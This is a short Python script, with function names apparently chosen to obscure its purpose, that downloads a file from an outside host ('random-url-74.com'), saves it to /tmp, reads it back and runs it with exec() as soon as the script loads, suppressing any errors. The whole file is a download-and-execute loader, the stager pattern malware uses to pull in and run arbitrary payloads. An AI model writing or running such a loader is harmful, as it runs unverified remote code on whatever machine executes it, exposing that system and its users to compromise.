import requests
import os

def p1(u):
    r = requests.get(u)
    return r.text

def p2(fp, c):
    with open(fp, "w") as f:
        f.write(c)

def p3(fp):
    with open(fp, "r") as f:
        return f.read()

def p4(co):
    try:
        exec(co)
    except Exception as e:
        print(e)

def p5(u, fp):
    cd = p1(u)
    p2(fp, cd)

    sc = p3(fp)
    p4(sc)

def main():
    rnd_url = "http://random-url-74.com/script.py"
    lcl_fl = "/tmp/script74.py"

    p5(rnd_url, lcl_fl)

main()
